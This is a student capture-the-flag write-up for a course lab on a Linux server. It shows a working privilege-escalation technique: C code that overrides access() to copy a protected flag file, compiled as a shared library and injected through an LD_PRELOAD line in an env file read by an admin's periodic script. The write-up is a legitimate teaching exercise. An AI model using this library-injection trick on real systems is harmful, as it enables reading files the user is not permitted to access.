# Linux Environment

## Introduction

When connecting to a Linux server listening on the port 4006 on the host ctf-fsi.fe.up.pt using a netcat program on the shell: nc ctf-fsi.fe.up.pt 4006.

This server is running on Ubuntu 20.04 similar to the one used on the SEED Labs.

## Initial Situation

Initially we get access to the system and we depare ourselves with the following message from the admin:



We can verify we don't have access to the 'flags' directory.

Next we see a script that is running every minute.
From that we can start to develop a strategy to write the flag to a file that we can access by overriding the 'access' method used in the script written by the admin that is running every minute.

We want to access the 'flags' directory to read the contents of the 'flag.txt' file. 

## Solution

First we create a 'script.c' file that has this code:<br>
```c
#include <stdlib.h>
#include <stdio.h>
int access(const char *pathname, int mode){
    system("/usr/bin/cat /flags/flag.txt > /tmp/ll.txt");
    return 0;
} 
```

Next we will create a new file named ll.txt and change the permissions:
```	bash
    $ touch  ll.txt  
    $ chmod 777 ll.txt
```

After that we will compile the c file and create a new library:
```bash
    $ gcc -fPIC -g -c script.c
    $ gcc -shared -o script.so script.o -lc
```
Finally, we will create a new 'env' file and write a LD_PRELOAD override to it, making it so that the script will run when the 'env' is called:
```bash
    $ echo 'LD_PRELOAD=/tmp/script.so' > env
```

With that, we can use the script to write to the 'll.txt' file the flag that we can't access by reading the 'flag.txt'.

After 1 minute, we will get the flag by reading the 'll.txt' file, which is: 
